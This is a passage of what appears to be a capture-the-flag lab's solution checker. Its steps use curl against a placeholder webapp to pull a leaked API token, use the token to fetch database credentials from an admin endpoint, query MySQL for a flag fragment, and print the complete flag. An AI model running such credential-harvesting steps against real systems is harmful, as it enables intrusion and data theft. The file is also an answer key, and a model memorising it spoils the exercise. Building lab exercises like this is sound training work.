    command: curl -s http://{target.webapp}/api/v2/users | grep -o 'SB_tk_4p1_v3rs10n'
    expect: SB_tk_4p1_v3rs10n
  - name: Use token to access admin config and retrieve DB credentials
    command: 'curl -s -H ''Authorization: Bearer SB_tk_4p1_v3rs10n'' http://{target.webapp}/api/v2/admin/config | grep -o ''St0n3br1dg3_DB#'''
    expect: St0n3br1dg3_DB#
  - name: Query MySQL for flag part 2
    command: mysql -h {target.dbserver} -u {cred.db.user} -p'{cred.db.pass}' stonebridge -N -e 'SELECT value FROM audit_flags LIMIT 1' 2>&1
    expect: l34k
  - name: Assemble and verify complete flag
    command: echo 'OCR{4p1_v3rs10n_l34k}'
    expect: OCR{
